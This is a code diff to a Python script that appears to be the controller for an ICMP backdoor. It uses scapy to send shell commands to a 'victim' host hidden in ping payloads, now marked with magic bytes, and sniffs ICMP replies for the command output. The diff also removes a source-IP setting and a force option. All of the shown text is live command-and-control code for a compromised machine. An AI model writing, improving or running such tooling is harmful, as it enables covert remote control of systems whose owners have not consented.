@@ -11,12 +11,10 @@ def get_IF_NAME():
     return tokens[tokens.index("dev")+1]
 
 
-SRC_IP = popen("ip -4 addr show " + get_IF_NAME() + " | awk '/inet /{print $2}' | cut -d'/' -f1").read().strip()
-
 def send_command(victim_ip, command, force):
-    pkt = IP(src=SRC_IP, dst=victim_ip, id=(6751 if not force else 31)) /\
-        ICMP(type=8, id=6751, seq=1) /\
-        Raw(load=command)
+    pkt = IP(dst=victim_ip) /\
+        ICMP(type=8) /\
+        Raw(load=f"\x70\x95\x05{command}")
     send(pkt, verbose=False)
 
 keep_sniffing = True
@@ -30,12 +28,13 @@ def process_packet(packet):
             print(output)
             keep_sniffing = False
 
+# need to refactor to srp if possible
 def start_sniffing():
     sniff(iface=get_IF_NAME(), filter="icmp", prn=process_packet, store=0)
 
 def main():
     if len(argv) < 2 or argv[1] == "":
-        print("Usage: ./script.py <Victim_IP> [-f]")
+        print("Usage: ./script.py <Victim_IP>")
         return
 
     vic_ip = argv[1]
